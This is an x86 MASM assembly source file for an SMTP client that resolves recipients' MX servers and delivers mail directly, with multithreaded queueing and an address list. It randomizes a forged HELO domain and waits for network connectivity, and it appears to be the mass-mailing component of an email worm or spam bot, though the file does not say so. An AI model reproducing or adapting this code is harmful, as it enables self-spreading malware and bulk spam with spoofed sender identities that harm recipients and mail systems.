; SMTP Client, sends messages directly to recepients via MX servers
; #########################################################################

.const

EMAIL_ENTRY struct
        EMAILStr        DWORD ?
        EMAILHash       DWORD ?
        Next            DWORD ?
        Host            DWORD ?
EMAIL_ENTRY ends

.data
        szHELO1         db      "HELO %s.net",13,10,0
        szHELO2         db      "HELO %s.com",13,10,0
        szHELO3         db      "HELO %s.org",13,10,0
        szRSET          db      "RSET",13,10,0
        szMAILFROM      db      "MAIL FROM:<%s>",13,10,0
        szMAILTO        db      "RCPT TO:<%s>",13,10,0
        szDATA          db      "DATA",13,10,0

.code

; Forward
EmailListClear proto :DWORD, :DWORD
ParseEmailStr proto :DWORD, :DWORD, :DWORD

; Return 3 octet smtp status (220, 250, 501, etc)
GetLineStatus proc stream: DWORD
        LOCAL   lpRead, lpbuf4: DWORD
                
        mov     lpbuf4, 0
        invoke  StreamGotoBegin, stream
        coinvoke stream, IStream, Read, addr lpbuf4, 3, addr lpRead
        .IF     lpRead >= 3
                mov     eax, lpbuf4
        .ELSE
                xor     eax, eax
        .ENDIF
        ret
GetLineStatus endp

EmailFormatMessage proto :DWORD, :DWORD

; Returns TRUE on success
DoSendEmailBody proc uses esi edi ebx email, fromuser, host: DWORD
        LOCAL   rstream, stream, lpbuf, lpRead: DWORD

        invoke  EmailFormatMessage, fromuser, email
        mov     stream, eax

        xor     edi, edi

        invoke  GlobalAlloc, GPTR, 8192
        mov     lpbuf, eax

        invoke  StreamCreate, addr rstream

        ; Connect to smtp server
        mov     ecx, 25
        xchg    cl, ch
        invoke  NetConnect, host, 0, ecx
        test    eax, eax
        jz      @dse_ret

        ; Receive server greet
        mov     ebx, eax
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '022'
        jnz     @dse_close

        ; Send HELO
        mov     esi, lpbuf
        add     esi, 2048
        invoke  gethostname, esi, 1024
        invoke  Rand, 3
        .IF     eax == 0
                mov     eax, offset szHELO1
        .ELSEIF eax == 1
                mov     eax, offset szHELO2
        .ELSE
                mov     eax, offset szHELO3
        .ENDIF
        invoke  wsprintf, lpbuf, eax, esi
        invoke  lstrlen, lpbuf
        invoke  send, ebx, lpbuf, eax, 0

        ; Recv HELO response
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '052'
        jnz     @dse_close

        ; Send RSET request
        invoke  lstrlen, offset szRSET
        invoke  send, ebx, offset szRSET, eax, 0

        ; Receive RSET ack
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '052'
        jnz     @dse_close

        ; Send MAIL FROM
        invoke  wsprintf, lpbuf, offset szMAILFROM, fromuser
        invoke  lstrlen, lpbuf
        invoke  send, ebx, lpbuf, eax, 0

        ; Receive MAIL FROM ack
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '052'
        jnz     @dse_close

        ; Send MAIL TO
        invoke  wsprintf, lpbuf, offset szMAILTO, email
        invoke  lstrlen, lpbuf
        invoke  send, ebx, lpbuf, eax, 0

        ; Receive MAIL TO ack
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '052'
        jnz     @dse_close

        ; Send DATA request
        invoke  lstrlen, offset szDATA
        invoke  send, ebx, offset szDATA, eax, 0

        ; Receive DATA ack
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '453'
        jnz     @dse_close

        ; Send email body
        invoke  StreamGotoBegin, stream
@send_mail:
        coinvoke stream, IStream, Read, lpbuf, 1024, addr lpRead
        .IF     lpRead > 0
                invoke  send, ebx, lpbuf, lpRead, 0
                test    eax, eax
                jle     @dse_close
                jmp     @send_mail
        .ENDIF

        ; Receive ack
        invoke  NetRecvSMTPLine, ebx, rstream, 1024, 15
        test    eax, eax
        jz      @dse_close

        invoke  GetLineStatus, rstream
        cmp     eax, '052'
        jnz     @dse_close

        ; Return TRUE
        inc     edi

@dse_close:
        invoke  closesocket, ebx

@dse_ret:
        invoke  StreamFree, rstream
        invoke  GlobalFree, lpbuf
        invoke  StreamFree, stream

        mov     eax, edi
        ret
DoSendEmailBody endp

; Forward
SMTPQueueAdd proto :DWORD, :DWORD, :DWORD

SendEmailBody proc uses ebx esi fromuser, touser: DWORD
        invoke  WaitUntilConnected
        invoke  StrRChr, touser, NULL, '@'
        .IF     eax
                inc     eax
                invoke  DNSGetMXHost, eax
                mov     esi, eax
                .IF     eax
                        ; Send using multiple threads
                        invoke  SMTPQueueAdd, touser, fromuser, esi
                        invoke  GlobalFree, esi
                .ENDIF
        .ENDIF

        ret
SendEmailBody endp

; Add email addr + params to the linked list
EmailListAdd proc uses ebx esi lpRoot, lpLast, lpEmailStr, dwHash, lpHost: DWORD
        mov     esi, lpEmailStr
        invoke  lstrlen, esi
        push    eax
        
        invoke  GlobalAlloc, GPTR, sizeof EMAIL_ENTRY
        mov     ebx, eax

        mov     edx, lpRoot
        mov     ecx, lpLast
        .IF     dword ptr[edx] == 0
                mov     [edx], ebx
        .ELSE
                push    ecx
                mov     ecx, [ecx]
                mov     [ecx][EMAIL_ENTRY.Next], ebx
                pop     ecx
        .ENDIF
        mov     [ecx], ebx

        pop     eax
        add     eax, 4
        invoke  GlobalAlloc, GPTR, eax
        mov     [ebx.EMAIL_ENTRY.EMAILStr], eax
        invoke  lstrcpy, eax, lpEmailStr
        m2m     [ebx.EMAIL_ENTRY.EMAILHash], dwHash
        m2m     [ebx.EMAIL_ENTRY.Host], lpHost

        ret
EmailListAdd endp
